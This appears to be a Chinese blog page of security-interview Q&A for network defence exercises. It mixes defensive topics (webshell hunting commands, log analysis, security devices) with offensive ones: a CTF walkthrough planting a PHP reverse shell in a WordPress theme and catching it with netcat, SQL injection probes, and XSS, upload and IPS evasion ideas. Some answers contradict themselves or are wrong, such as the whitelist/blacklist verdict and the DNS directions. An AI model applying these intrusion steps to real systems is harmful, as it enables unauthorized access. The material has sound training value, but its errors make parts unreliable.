+<h1 id="如何有一个webshell已经被上传-如何排查webshell是如何上传的-有什么思路"><a href="#如何有一个webshell已经被上传-如何排查webshell是如何上传的-有什么思路" class="headerlink" title="如何有一个webshell已经被上传,如何排查webshell是如何上传的,有什么思路?"></a>如何有一个webshell已经被上传,如何排查webshell是如何上传的,有什么思路?</h1><ul>
+<li>全面扫描：隔离webshell，但是需要判断代码的内容，避免误删</li>
+<li>手动全面查杀：</li>
+<li>命令查找关键函数：PHP : find 网站目录/<em> -type f -name “</em>.php” |xargs grep “eval”</li>
+<li>JSP:find 网站目录/<em> -type f -name “</em>.php” |xargs grep “eval”</li>
+<li>jspx 文件：find 网站目录/<em> -type f -name “</em>.jspx” |xargs grep “getRuntime”</li>
+<li>查找异常端口进程情况：查找异常端口进程情况：Linux ：netstat -anltp|grep bash</li>
+<li>查看目前的网络连接，定位可疑的ESTABLISHED，根据 netstat 定位出的 pid，再通过 tasklist 命令进行进程定位 tasklist | findstr “PID”</li>
+<li>分析应用的日志，中间件日志，系统操作日志等。</li>
+<li>使用流量设备定位webshell</li>
+</ul>
+<h1 id="安全项目有做过吗"><a href="#安全项目有做过吗" class="headerlink" title="安全项目有做过吗?"></a>安全项目有做过吗?</h1><p>●CTF靶机渗透<br>●流量分析<br>●代码审计<br>●漏洞挖掘</p>
+<h2 id="靶机渗透经历"><a href="#靶机渗透经历" class="headerlink" title="靶机渗透经历"></a>靶机渗透经历</h2><p><strong>目标：</strong>获取靶机Web Developer 文件/root/flag.txt中flag<br>基本思路：</p>
+<ul>
+<li>本网段IP地址存活扫描(netdiscover)；</li>
+<li>网络扫描(Nmap)；浏览HTTP 服务；</li>
+<li>网站目录枚举(Dirb)；</li>
+<li>发现数据包文件 “cap”；</li>
+<li>分析 “cap” 文件，找到网站管理后台账号密码；</li>
+<li>插件利用（有漏洞）；</li>
+<li>利用漏洞获得服务器账号密码；</li>
+<li>SSH 远程登录服务器；</li>
+<li>tcpdump另类应用</li>
+</ul>
+<p><strong>步骤1</strong></p>
+<ul>
+<li>发现目标 (netdiscover)，找到WebDeveloper的IP地址</li>
+</ul>
+<p><strong>步骤2</strong></p>
+<ul>
+<li>查看目标主机端口开放、服务情况（NMAP扫描）</li>
+<li>Kali扫描WebDeveloper的IP：nmap 192.168.222.135</li>
+</ul>
+<p><img src="/images/hvv-question/1678712964088-799aecb6-26eb-4328-afdd-b570fd178b8f.png" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>可以看到开放了80端口和22端口，这两个端口的作用分别是http端口（网页）和ssh端口（远程登陆）</li>
+</ul>
+<p><strong>步骤3</strong></p>
+<ul>
+<li>利用浏览器访问目标网站，由于目标主机提供了HTTP服务，网站开放了80端口，所以在kali的浏览器地址栏中登陆http端口</li>
+</ul>
+<p><img src="/images/hvv-question/1678712993251-59615849-0bc1-401a-a29d-cb206a49ad9b.png" alt="img" style="zoom:80%;" /><br><strong>步骤4</strong></p>
+<ul>
+<li>whatweb探测目标网站使用的CMS模板</li>
+<li>在kali输入whatweb 10.34.80.3进行检测可得到如图信息：</li>
+</ul>
+<p><img src="/images/hvv-question/1678713472622-04c3edd6-3dbe-4c76-99f9-69f13c7666ff.jpeg" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>可看见，该网站的CMS为WordPress</li>
+</ul>
+<p><strong>步骤5：</strong>wpscan功能</p>
+<ul>
+<li>WPScan是Kali Linux默认自带的一款漏洞扫描工具,它采用Ruby编写,能够扫描WordPress网站中的多种安全漏洞,其中包括WordPress本身的漏洞、插件漏洞和主题漏洞。</li>
+</ul>
+<p><strong>步骤6：</strong></p>
+<ul>
+<li>Dirb 爆破网站目录，.在kali中输入命令</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.222.135</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29405061/1678713561587-97a01bc2-1fda-4d7a-885a-2ba449788721.png" alt="img" style="zoom:80%;" /><br>可看见一个ipdata,根据意思猜测其是流量消息，尝试浏览器访问看看：</p>
+<ul>
+<li>发现有一个cap文件</li>
+</ul>
+<p><img src="/images/hvv-question/1678713591259-af0d7faf-88b0-4b9f-a33d-c158196a7c11.png" alt="img" style="zoom:80%;" /><br><strong>步骤7：</strong></p>
+<ul>
+<li>Wireshark分析该数据包，分析TCP数据流</li>
+<li>点击图中的analyze.cap下载,找到该文件然后拖进wireshark.</li>
+<li>点击搜索，输入login（登录），发现好东西啦！在蓝色条条里可看见该网址</li>
+</ul>
+<p><img src="/images/hvv-question/1678713706529-55ffa566-dccf-4f24-bf5d-1fdf297075b9.png" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>然后去浏览器输入WebDeveloper的IP和/wp-login.php，即可看见登陆页面</li>
+</ul>
+<p><img src="/images/hvv-question/1678713720020-5d0b5f0a-c36d-4400-b1b0-498e3e71f091.png" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>随便输入一个账号和密码，到Burp sure里找刚刚提交信息的地址：</li>
+</ul>
+<p><img src="/images/hvv-question/1678713743398-d27113db-e8f8-4eaf-be83-d70f6beb2e97.png" alt="img" style="zoom: 80%;" /></p>
+<ul>
+<li>找到后去Wireshark筛选http请求类型为post的请求，追踪TCP流可得：</li>
+</ul>
+<p><img src="/images/hvv-question/1678713761765-0f787527-a6c5-4670-ba29-3b0c8a370324.png" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>可见账号为webdeveloper,密码为Te5eQg%264sBS%2lYr%24%29wf%25%28DcAd</li>
+<li>利用上一步得到的信息进入网站后台</li>
+<li>我们将改账号密码复制到Burp sure，把原来的改成这个。最后去浏览器刷新即可成功进入网站后台!</li>
+</ul>
+<p><img src="/images/hvv-question/1678713777510-5040fc8d-88a7-4a89-853b-a6a1d3fbab25.png" alt="img" style="zoom:80%;" /></p>
+<ul>
+<li>该CMS为PHP开发，可以利用其实现反弹shell。但必须修改初始化IP地址和端口。（指向攻击者）。</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">http://pentestmonkey.net/tools/web-shells/php-reverse-shell</a><br>【目的：PHP网站渗透；实现途径：上传网站后，URL访问(含有)该反弹shell的页面</p>
+<ul>
+<li>进入后台，找到任意一个PHP页面，然后利用php-reverse-shell.PHP的代码修改该页面的代码。</li>
+<li>修改代码中反弹目标的IP地址及端口（修改为攻击者IP地址及开放的端口号）。<ul>
+<li>首先需要点击右栏的404 Tamplate把这里的theme给修改为Twenty Sixteen然后点击Select。</li>
+<li>然后将php文件复制粘贴过来，记得upload！</li>
+</ul>
+</li>
+<li>在Kali中利用NC开始监听，浏览器访问修改的PHP页面。从而得到反弹shell（用户www-data）。建立会话后，查看wp-config.php获得账号及口令。（注意路径）</li>
+</ul>
+<h1 id="像这种thinkphp-rce漏洞-shiro漏洞有复现过吗-ctfshow"><a href="#像这种thinkphp-rce漏洞-shiro漏洞有复现过吗-ctfshow" class="headerlink" title="像这种thinkphp rce漏洞/shiro漏洞有复现过吗?(ctfshow)"></a>像这种thinkphp rce漏洞/shiro漏洞有复现过吗?(ctfshow)</h1><p>&emsp;<strong>thinkphp rce漏洞：</strong>比如5.0版本有个rce漏洞，该漏洞的漏洞关键点存在于thinkphp/library/think/Request.php文件中。<br>&emsp;<strong>shiro漏洞</strong>：在docker中复现了多个漏洞。</p>
+<h1 id="如果给一个数据包-是漏洞利用的数据包-比如是一个RCE漏洞-怎么判定是否是一个误报-有没有什么思路"><a href="#如果给一个数据包-是漏洞利用的数据包-比如是一个RCE漏洞-怎么判定是否是一个误报-有没有什么思路" class="headerlink" title="如果给一个数据包,是漏洞利用的数据包,比如是一个RCE漏洞,怎么判定是否是一个误报?有没有什么思路?"></a>如果给一个数据包,是漏洞利用的数据包,比如是一个RCE漏洞,怎么判定是否是一个误报?有没有什么思路?</h1><ul>
+<li>可以看回显数据包信息来判断</li>
+</ul>
+<h1 id="最新的漏洞有了解过吗"><a href="#最新的漏洞有了解过吗" class="headerlink" title="最新的漏洞有了解过吗?"></a>最新的漏洞有了解过吗?</h1><p>有了解过去年12月爆发的apache log4j漏洞：</p>
+<ul>
+<li>apache log4j是基于java的开源日志记录工具，通过log4j可以控制日志信息的输出目的地是控制台、文件、gui组件甚至是套接口服务器、事件记录器、syslog守护进程等。我们也可以控制每一条日志的输出格式。</li>
+<li>最新版本的cve-2021-44228漏洞影响的是2.15.0之前的版本，存在通过LDAP JNDI解析器的代码执行的漏洞。</li>
+</ul>
+<h1 id="SQL注入类型和函数，替代函数"><a href="#SQL注入类型和函数，替代函数" class="headerlink" title="SQL注入类型和函数，替代函数"></a>SQL注入类型和函数，替代函数</h1><ul>
+<li>时间盲注的函数：sleep、benchmark、笛卡尔积、GET-LOCK加锁、正则匹配</li>
+<li>布尔盲注的函数：left、substr、length、mid、ascii、regexp正则</li>
+</ul>
+<h1 id="平台上有一个RCE漏洞告警-比如是通达OA的-如何识别攻击成功"><a href="#平台上有一个RCE漏洞告警-比如是通达OA的-如何识别攻击成功" class="headerlink" title="平台上有一个RCE漏洞告警,比如是通达OA的,如何识别攻击成功?"></a>平台上有一个RCE漏洞告警,比如是通达OA的,如何识别攻击成功?</h1><ul>
+<li>OA有很多:通达OA,致远OA,泛微OA(都<strong>是些自动化的协同办公软件</strong>)</li>
+<li>首先我会把告警中的数据包提取一下,把一些敏感字符串丢到百度上查询一下,看看有没有相似的漏洞复现</li>
+<li>然后找到对应的POC或者EXP,比对数据包中的poc或exp,看看相同不相同</li>
+<li>之后要看返回包,可以复现成功得返回信息是否一致,如果一致就是攻击成功,如果不一致就不成功</li>
+</ul>
+<h1 id="mysql在linux的配置文件是哪个？"><a href="#mysql在linux的配置文件是哪个？" class="headerlink" title="mysql在linux的配置文件是哪个？"></a>mysql在linux的配置文件是哪个？</h1><p><strong>my.cnf</strong><br>1、Windows下MySQL的配置文件是my.ini，一般会在安装目录的根目录。<br>2、Linux下MySQL的配置文件是my.cnf，一般会放在/etc/my.cnf，/etc/mysql/my.cnf。如果找不到，可以用find命令查找。<br>3、Linux用rpm包安装的MySQL是不会安装/etc/my.cnf文件的</p>
+<h1 id="如何判断使用的什么数据库？（判断后台数据库类型）"><a href="#如何判断使用的什么数据库？（判断后台数据库类型）" class="headerlink" title="如何判断使用的什么数据库？（判断后台数据库类型）"></a>如何判断使用的什么数据库？（判断后台数据库类型）</h1><h2 id="一、根据网页编程语言去判断"><a href="#一、根据网页编程语言去判断" class="headerlink" title="一、根据网页编程语言去判断"></a>一、根据网页编程语言去判断</h2><p>ASP和.NET：Microsoft SQL Server<br>PHP：MySQL、PostgreSQL<br>Java：Oracle、MySQL以上是常见的搭配。</p>
+<h2 id="二、根据数据库报错判断"><a href="#二、根据数据库报错判断" class="headerlink" title="二、根据数据库报错判断"></a>二、根据数据库报错判断</h2><p>&emsp;输入单引号报错mysql:error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 1 mssql：因为mssql是微软公司的，里面出现微软的英文名字Microsoft还有ODBC也是mssql特有的。</p>
+<ul>
+<li><strong>Inputting special characters, such as single quotes</strong>, to make the program return error messages, and then judging by the error message prompts</li>
+<li><strong>Using specific functions to judge,</strong> such as inputting “1 and version()&gt;0”, if the program returns normally, it means that the version() function is recognized and executed by the database, and the version() function is a MySQL-specific function, so it can be inferred that the backend database is MySQL12.</li>
+<li><strong>Using database-specific data tables to judge</strong>, such as using “select count() from sysobjects” for MSSQL database, “select count() from msysobjects” for Access database, “select count(*) from user_tables” for Oracle database3.</li>
+</ul>
+<h1 id="可以用编码的方式绕过吗？用什么方式编码？"><a href="#可以用编码的方式绕过吗？用什么方式编码？" class="headerlink" title="可以用编码的方式绕过吗？用什么方式编码？"></a>可以用编码的方式绕过吗？用什么方式编码？</h1><p>1.URL编码、2.十六进制编码、3.Unicode编码</p>
+<h1 id="XSS如何检测，有什么危害。被过滤了如何绕过？"><a href="#XSS如何检测，有什么危害。被过滤了如何绕过？" class="headerlink" title="XSS如何检测，有什么危害。被过滤了如何绕过？"></a>XSS如何检测，有什么危害。被过滤了如何绕过？</h1><p>1、大小写和双写绕过 2、a标签 3、src属性 4、利用事件绕过<br>xss绕过</p>
+<p><img src="/images/hvv-question/1678717466780-6aedc8a7-9523-4c7a-bf30-0999bebaa18c.png" alt="image.png"></p>
+<h1 id="文件上传如何判断是白名单还是黑名单？哪种方式更好，为什么？"><a href="#文件上传如何判断是白名单还是黑名单？哪种方式更好，为什么？" class="headerlink" title="文件上传如何判断是白名单还是黑名单？哪种方式更好，为什么？"></a>文件上传如何判断是白名单还是黑名单？哪种方式更好，为什么？</h1><ul>
+<li>如果测试只能上传特定的文件类型比如图片，其他任意类型都不可上传，即为白名单</li>
+<li>如果测试只有特定的文件不能上传，其他类型都可以上传，即为黑名单。</li>
+<li>白名单更好。因为不容易被绕过</li>
+</ul>
+<p>黑名单：明确不允许上传的文件格式后缀<br>●常见脚本格式：ASP、PHP、JSP、ASPX、cgi、war …<br>●可能绕过方式（与网站搭建平台和设置格式有关）：php5 、phtml …<br>白名单：明确可以上传的文件格式：<br>●JPG、PNG、zip、rar、gif …<br>●黑名单要安全一些</p>
+<h1 id="溯源如果挂了代理怎么做？"><a href="#溯源如果挂了代理怎么做？" class="headerlink" title="溯源如果挂了代理怎么做？"></a>溯源如果挂了代理怎么做？</h1><p>① 首先我要去查看报警日志,看一下是IP还是域名</p>
+<ul>
+<li>如果是域名可以挂CDN,国外CloudFlare</li>
+<li>如果没有CDN,用多地ping或者dns查询获取真实IP</li>
+<li>如果有CDN,用各种方法<ul>
+<li>如果是IP,就需要查看数据包类型,有可能是http,tcp,…..</li>
+<li>如果是http,我可以去查看一下数据包的请求,有一些字段会暴露代理IP</li>
+<li>REMOTE_ADDR 如果使用了代理就是代理IP,没有使用就是自己的IP</li>
+<li>除此之外还有其他的一些字段,HTTP_X_FORWARDED_FOR</li>
+<li>如果是socks,比如sock4或sock5,有一种情况是sock协议不会使用udp协议</li>
+</ul>
+</li>
+<li>我可以给IP发UDP数据包,查看返回信息,如果没有正确响应就说是代理</li>
+</ul>
+<h1 id="Nginx的日志放在那里，如何进行分析-主要看哪些你认为重要的地方？"><a href="#Nginx的日志放在那里，如何进行分析-主要看哪些你认为重要的地方？" class="headerlink" title="Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？"></a>Nginx的日志放在那里，如何进行分析?主要看哪些你认为重要的地方？</h1><p>配置文件/etc/nginx/nginx.conf<br>Nginx的日志分为访问日志access_log和错误日志error_log两大块，前者主要记录用户每次访问的情况，后者则侧重于服务器的具体错误，比如返回403的具体原因是文件不可读还是权限不足之类的。<br><strong>分析access_log：</strong><br>1、可以根据每个所关心的字段读取频率最高的前十看看是否有什么出乎意料的情况，以客户端IP，客户端User-Agent，<br>以及返回<strong>状态码</strong>为例。<br>2、流量观察:对于一般网站来说流量监控也是比较重要的，所以根据访问时间，可以统计出每天的访问量和一天中平均各个时间段的访问量：<br><strong>分析error_log</strong>：<br>错误类型、路径错误、SEO（搜索引擎优化）、查错示例</p>
+<h1 id="系统日志放在那里？"><a href="#系统日志放在那里？" class="headerlink" title="系统日志放在那里？"></a>系统日志放在那里？</h1><p>windows的在Windows\System32\winevt\Logs<br>linux的var/log</p>
+<h1 id="护网中用到的安全设备了解过吗？"><a href="#护网中用到的安全设备了解过吗？" class="headerlink" title="护网中用到的安全设备了解过吗？"></a>护网中用到的安全设备了解过吗？</h1><p>IDS/IPS、态势感知,蜜罐，沙箱</p>
+<h2 id="IDS-IPS"><a href="#IDS-IPS" class="headerlink" title="IDS/IPS"></a>IDS/IPS</h2><ul>
+<li>护网中用到的安全设备IDS/IPS是指入侵检测系统和入侵防御系统，它们是网络安全的重要组成部分。</li>
+</ul>
+<p>IDS/IPS的主要区别在于：</p>
+<ul>
+<li>IDS是被动防御，只能检测到入侵行为并发出警报，但不能阻止攻击。IDS一般部署在网络的关键位置，如服务器区域、Internet接入路由器之后或重点保护网段的交换机上1。</li>
+<li>IPS是主动防御，可以实时拦截和隔离异常或恶意的网络流量，避免其造成损害。IPS一般嵌入到网络流量中，通过两个端口接收和传送数据包，并对其进行检查2。</li>
+</ul>
+<h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐"></a>蜜罐</h2><ul>
+<li>蜜罐是一种网络安全技术，用于欺骗和诱导攻击者，从而保护真实的系统和设备。</li>
+<li>蜜罐可以模拟各种有漏洞的业务系统，吸引黑客的注意力，同时收集和分析攻击行为和特征。</li>
+<li>护网中用到的蜜罐主要有以下几种：<ul>
+<li>低交互蜜罐：这种蜜罐只提供有限的服务和功能，不能与攻击者进行深入的交互，只能记录基本的攻击信息，如IP地址、端口号、扫描工具等。低交互蜜罐的优点是部署简单，资源消耗少，难以被发现；缺点是不能捕获复杂的攻击行为和技巧，也不能诱捕高级的攻击者。</li>
+<li>高交互蜜罐：这种蜜罐提供完整的服务和功能，能与攻击者进行深入的交互，记录详细的攻击信息，如命令、文件、密码等。高交互蜀国的优点是能捕获复杂的攻击行为和技巧，也能诱捕高级的攻击者；缺点是部署复杂，资源消耗多，容易被发现或破坏。</li>
+<li>智能蜜罐：这种蜀国利用人工智能和机器学习等技术，动态地调整自身的服务和功能，根据不同的攻击者提供不同的响应和反馈。智能蜀国的优点是能适应不同的攻击场景和需求，提高欺骗效果和安全性；缺点是开发难度大，需要大量的数据和算法支持</li>
+</ul>
+</li>
+</ul>
+<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><ul>
+<li>沙箱是一种用于隔离和分析恶意样本的技术，可以在不影响操作系统的情况下运行可疑的程序或文件。</li>
+<li>护网中用到的沙箱有多种类型，例如Windows沙箱、Adobe沙箱、云沙箱等。</li>
+</ul>
+<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>&emsp;防火墙是位于两个(或多个)网络间，实行网络间访问或控制的一组组件集合之硬件或软件。隔离网络，制定出不同区域之间的访问控制策略来控制不同信任程度区域间传送的数据流。</p>
+<h2 id="数据库审计系统"><a href="#数据库审计系统" class="headerlink" title="数据库审计系统"></a>数据库审计系统</h2><p>&emsp;是对数据库访问行为进行监管的系统，通过镜像或者探针的方式采集所有数据库的访问流量，并基于SQL语法，语义的解析技术，记录下对数据库所有访问和操作行为，例如访问数据的用户IP，账号，时间等等，对数据进行操作的行为等等。</p>
+<h2 id="日志审计系统"><a href="#日志审计系统" class="headerlink" title="日志审计系统"></a>日志审计系统</h2><p> &emsp;日志审计系统能够通过主被动结合的手段，实时且不间断的采集用户网络中不同厂商的安全设备，网络设备，主机，<a target="_blank" rel="noopener" href="https://heibai.org.cn/tags-210.html">操作系统</a>以及各种应用系统产生的海量日志信息，并将这些信息汇集到审计中心，进行集中化存储，备份，查询，审计，告警，响应，并出具丰富的报表报告，获悉全网的整体安全运行态势，同时满足等保关于安全管理中心的日志保存时间大于6个月的要求。</p>
+<h2 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h2><p>&emsp;是针对内部运维人员的运维安全审计系统。主要功能是对运维人员的运维操作进行审计和权限控制(比如要登录某些平台或者系统只能通过堡垒机才可以，不用堡垒机是无法访问的)。同时堡垒机还有账号集中管理，单点登录(在堡垒机上登录即可实现对多个其他平台的无密登录)等功能。</p>
+<h2 id="漏洞扫描系统"><a href="#漏洞扫描系统" class="headerlink" title="漏洞扫描系统"></a>漏洞扫描系统</h2><p>&emsp;漏洞扫描工具或者设备是基于漏洞数据库，通过扫描等手段对指定的远程或本地计算机系统的安全脆弱性进行检测，发现可利用漏洞的一种安全检测系统(我们常用的针对WEB站点进行扫描的工具和此处漏洞扫描系统不是一个概念)。</p>
+<h2 id="数据安全态势感知平台"><a href="#数据安全态势感知平台" class="headerlink" title="数据安全态势感知平台"></a>数据安全态势感知平台</h2><p>&emsp;以大数据平台为基础，通过收集多元，异构的海量日志，利用关联分析，机器学习，威胁情报，可视化等技术，帮助用户持续监测网络安全态势，实现从被动防御向积极防御的进阶。</p>
+<h1 id="遇到了IDS-IPS你如何对抗？"><a href="#遇到了IDS-IPS你如何对抗？" class="headerlink" title="遇到了IDS/IPS你如何对抗？"></a>遇到了IDS/IPS你如何对抗？</h1><p>回答了绕过，<br><strong>问：如何绕过：</strong></p>
+<ul>
+<li>IDS工作在网络层，旁路部署，通过抓取和分析网络流量来发现攻击；</li>
+<li>IPS一般也是在网络层旁路，可以理解为具备阻断能力的IDS，是IDS的升级版，可以覆盖网络层和应用层；</li>
+<li>WAF是在应用层防护Web攻击的程序，一般是跟Web接入层对接，可旁路可串行，仅能覆盖应用层</li>
+<li>IPS的旁路防护原理很简单，其经典代表如开源的Snort，就是在网络上分析流量，发现符合规则的流量则冒充服务端回包响应客户端实现阻断或者替换的目的，这是一种典型的链路劫持手法。常见的场景是封禁网站（如非法网站的封禁）、篡改网页内容（运营商插广告）、阻断端口扫描和漏洞攻击（IPS），实施链路劫持的人必须控制某段网络。</li>
+<li>因为IPS是旁路部署，所以只能通过发伪造包的方式来达到干扰双方正常通信的目的，正常的包其实还是会到达客户端和服务端，只不过相同序号的包操作系统已经处理过了，这些包会被认为是错误的包从而丢掉。</li>
+</ul>
+<p><strong>从原理分析，绕过IPS可以从两个方向着手</strong>：<br>1）检测上，如果IPS在流量里检测不到攻击特征，则不会有后续动作；<br>2）阻断上，正常包也会到达服务器，只是来晚了，如果有办法让伪造的包失效，则阻断不会发生。</p>
+<h1 id="DNS的工作原理："><a href="#DNS的工作原理：" class="headerlink" title="DNS的工作原理："></a>DNS的工作原理：</h1><p>DNS( Domain Name System)是“域名系统”的英文缩写，是一种组织成域层次结构的计算机和网络服务命名系统，它用于TCP/IP网络，它所提供的服务是用来将主机名和域名转换为IP地址的工作。你可以把它想象成一本巨大的电话本。属于应用层协议；</p>
+<ul>
+<li>正反向解析事两个不同得名称空间，是两颗不同得解析树；</li>
+</ul>
+<p>正向：ip—-&gt;主机名<br>反向：主机名—-&gt;ip<br><strong>总结域名解析过程：</strong><br>按顺序查找，找到则成功退出<br>1.浏览器的DNS缓存查找，没有则2<br>2.操作系统的DNS缓存查找，没有则3<br>3.host文件查找，没有则4<br>4.TCP/IP设置的本地DNS服务器查找，没有则5<br>5.DNS服务器的缓存，如果缓存中也没找到，没有则6<br>6.13台根DNS，同上问讲的理想状态寻找，一层域，一层域找</p>
+<h1 id="cooike和session的原理。哪个更安全？"><a href="#cooike和session的原理。哪个更安全？" class="headerlink" title="cooike和session的原理。哪个更安全？"></a>cooike和session的原理。哪个更安全？</h1><ul>
+<li>会话（Session）跟踪是Web程序中常用的技术，用来跟踪用户的整个会话。常用的会话跟踪技术是Cookie与Session。</li>
+<li>Cookie通过在客户端记录信息确定用户身份，</li>
+<li>Session通过在服务器端记录信息确定用户身份，Session更安全一些。</li>
+</ul>
+<h1 id="redis了解吗？有通过redis拿过shell吗？"><a href="#redis了解吗？有通过redis拿过shell吗？" class="headerlink" title="redis了解吗？有通过redis拿过shell吗？"></a>redis了解吗？有通过redis拿过shell吗？</h1><ul>
+<li>Redis简介是一个开源、基于内存、高性能、可数据持久化的key-value存储系统，遵守BSD协议，可用作数据库、缓存和消息中间件。</li>
+<li><strong>简单来说 redis 就是一个Key-Value类型的数据库， redis 所有数据全部在内存中进行操作，并且它可以将内存中的数据定期存储在磁盘中，并且支持保存多种数据结构(String、hash、list等)。</strong></li>
+<li>redis的特性：支持多种数据类型、支持数据的持久化机制、支持事务控制、支持主从复制功能等。</li>
+</ul>
+<p>Redis的数据存储是通过Key映射Value的方式，建立字典以保存数据。Redis共支持五种数据类型。<br>（1）String（字符串）<br>Redis最基本的类型，一个key对应一个value。<br>（2）Hash（哈希表）<br>键值对集合，是一个string类型的数据域field和值value的映射表。<br>（3）List（列表）<br>字符串列表，按照插入顺序排序。支持在列表的头部或者尾部添加数据元素。<br>（4）Set（集合）<br>字符串类型的无序集合，支持添加、删除、查找，Redis还能对set进行交集、并集、差集等集合操作。<br>（5）Zset（有序集合）<br>字符串类型的有序集合，集合中的每个元素都会关联一个double类型的分数。Redis通过这个分数为集合进行排序。<br><strong>Redis漏洞：</strong><br>1、未授权访问漏洞<br>2、定时计划反弹shell<br>3、利用主从复制rce</p>
+<h1 id="假设有一个注入点，怎么进行-sql-注入"><a href="#假设有一个注入点，怎么进行-sql-注入" class="headerlink" title="假设有一个注入点，怎么进行 sql 注入"></a>假设有一个注入点，怎么进行 sql 注入</h1><p>如果有一个注入点，常见方式是<strong>直接将代码拼接到用户输入的变量中，然后执行</strong>。SQL 注入也可能发生在其他位置，比如 UPDATE、INSERT 或 SELECT 语句中的值、表名、列名或排序条件。<br><strong>同步 SQL 注入：</strong>这种方式是最常见的，它通过在同一个通道中发送和接收数据，来获取数据库的信息或执行命令。同步 SQL 注入分为两种：（1）基于错误的 SQL 注入：利用数据库服务器抛出的错误信息，来获取数据库的数据。（2）基于联合的 SQL 注入：使用 UNION操作符，来合并两个或多个查询的结果，并返回给用户。<br><strong>推断 SQL 注入：</strong>这种方式是一种盲注，它不依赖于从数据库服务器返回的数据，而是通过观察服务器的响应时间或状态，来推断数据库的信息或执行命令。推断 SQL 注入分为两种：（1）基于布尔值的 SQL 注入：这种方式通过向数据库发送一些布尔表达式，来判断它们是否成立。（2）基于时间的 SQL 注入：这种方式通过向数据库发送一些延时函数，来判断它们是否执行，并根据服务器的响应时间来推断信息。<br><strong>异步 SQL 注入：</strong>这种方式是一种非常隐蔽的攻击，它通过<strong>在不同的通道中发送和接收数据</strong>，来获取数据库的信息或执行命令。<strong>异步 SQL 注入需要数据库服务器能够发起外部连接</strong>，并且攻击者能够控制一个外部服务器来接收数据。</p>
+<h1 id="护网时常用的linux命令"><a href="#护网时常用的linux命令" class="headerlink" title="护网时常用的linux命令"></a>护网时常用的linux命令</h1><ul>
+<li><strong>visudo</strong>：修改 /etc/sudoers 文件，这个文件定义了哪些用户可以使用 sudo 命令。</li>
+<li><strong>who</strong> 和 <strong>w</strong>：可以显示当前登录到系统的用户，以及他们在做什么。可以帮助监控系统的活动，并且发现异常或可疑的登录。</li>
+<li><strong>last</strong>：可以显示系统的登录历史，包括用户、时间、终端和 IP 地址等信息。可以帮助追溯系统的访问记录，并且分析潜在的攻击或入侵。</li>
+<li><strong>find</strong>：可以根据一些条件来搜索文件或目录，例如名称、大小、权限、所有者等。可以帮助查找敏感或重要的文件，并且检查它们是否被修改或损坏。</li>
+<li><strong>file</strong>：可以显示文件的类型，例如文本、二进制、压缩、可执行等。这个命令可以帮助识别文件的内容，并且避免运行恶意或未知的文件。</li>
+<li><strong>which</strong>：可以显示一个命令的完整路径，例如 /usr/bin/ls。可以帮助确定你正在使用哪个版本或实例的命令，并且避免被欺骗或误导。</li>
+</ul>
+<h1 id="常见的反序列化漏洞有哪些？"><a href="#常见的反序列化漏洞有哪些？" class="headerlink" title="常见的反序列化漏洞有哪些？"></a>常见的反序列化漏洞有哪些？</h1><p><strong>Java 反序列化漏洞：</strong></p>
+<ul>
+<li><strong>Struts 2 反序列化漏洞</strong>：Struts 2 是一个基于 MVC 模式的 Java Web 框架，它在 2017 年被曝出了一个严重的反序列化漏洞（CVE-2017-5638）。该漏洞是由于 Struts 2 在处理 Content-Type 头时，没有正确地过滤用户输入，导致攻击者可以构造一个恶意的 OGNL 表达式，触发 Apache Commons Collections 中的一个可利用的方法链，从而执行任意命令。</li>
+<li><strong>WebLogic 反序列化漏洞</strong>：WebLogic 是一个流行的 Java 应用服务器，它在多个版本中存在反序列化漏洞，如 CVE-2017-10271、CVE-2018-2628、CVE-2019-2725、CVE-2020-2555 等。这些漏洞都是由于 WebLogic 在处理某些特定的请求时，没有正确地验证用户输入，导致攻击者可以构造一个恶意的 Java 对象，触发一些存在缺陷的类库中的一个可利用的方法链，从而执行任意命令。</li>
+</ul>
+<p><strong>php反序列化漏洞：</strong></p>
+<ul>
+<li><strong>PHP 对象注入漏洞</strong>：当一个 PHP 应用程序使用不安全的方式来反序列化来自不可信来源的对象时，可能导致攻击者执行任意 PHP 代码或利用一些存在缺陷的类库来触发远程命令执行。这种漏洞通常利用了 PHP 的特性，如魔术方法、<strong>wakeup()、</strong>destruct()、__toString() 等，以及一些常见的类库中存在的可利用的方法链，如 Laravel、Symfony、WordPress 等。</li>
+<li><strong>PHP PHAR 反序列化漏洞</strong>：当一个 PHP 应用程序使用不安全的方式来处理 PHAR 文件时，可能导致攻击者执行任意 PHP 代码来触发远程命令执行。这种漏洞是由于 PHP 在处理 PHAR 文件时，会自动调用 phar:// 流包装器，并且触发 PHAR 文件中的元数据反序列化，导致攻击者可以构造一个恶意的 PHAR 文件，触发一些存在缺陷的类库中的一个可利用的方法链，从而执行任意命令。</li>
+</ul>
+<h1 id="sql注入中，如何加快盲注速度？"><a href="#sql注入中，如何加快盲注速度？" class="headerlink" title="sql注入中，如何加快盲注速度？"></a>sql注入中，如何加快盲注速度？</h1><ul>
+<li>使用二分法或其他算法来减少猜测次数。</li>
+<li>使用多线程或并发请求来提高效率。</li>
+<li>使用布尔盲注或时间盲注来代替基于内容的盲注，避免过滤敏感信息。</li>
+<li>使用其他字符或函数来绕过逗号过滤，如 || 和 &amp;&amp; 等。</li>
+<li>使用tamper脚本来自动化绕过一些常见的过滤规则。tamper脚本是一种用于修改或绕过SQL注入的payload的脚本，可以帮助用户适应不同的过滤规则或WAF。tamper脚本通常是用Python编写的，可以在sqlmap中使用–tamper参数来调用。</li>
+</ul>
